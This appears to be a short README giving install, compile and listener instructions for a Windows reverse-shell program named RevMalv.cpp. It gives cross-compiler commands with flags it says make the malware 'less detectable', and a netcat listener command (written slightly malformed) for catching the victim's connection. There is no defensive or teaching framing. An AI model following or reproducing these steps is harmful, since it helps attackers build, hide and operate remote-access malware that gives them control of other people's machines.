*** INSTALL REQUIREMENTS FOR COMPILE ***
// DEBIAN
sudo apt install netcat
sudo apt install g++mingw-w64-i686

// ARCH LINUX
sudo pacman -S gnu-netcat
sudo pacman -S mingw-w64-i686-gcc

// compile the malware (RevMalv.cpp) into a lightweight and less detectable executable
// by using flags to strip debugging symbols and statically link libraries

i686-w64-mingw32-g++ -std=c++11 RevMalv.cpp -o RevMalv.exe -s -lws2_32 -Wno-write-strings -static -static-libstdc++ -static-libgcc

*** NETCAT LISTENER ***
// nc lvp -8080
- nc = netcat
- -lvp = listen-verbose-port
- 8080 = port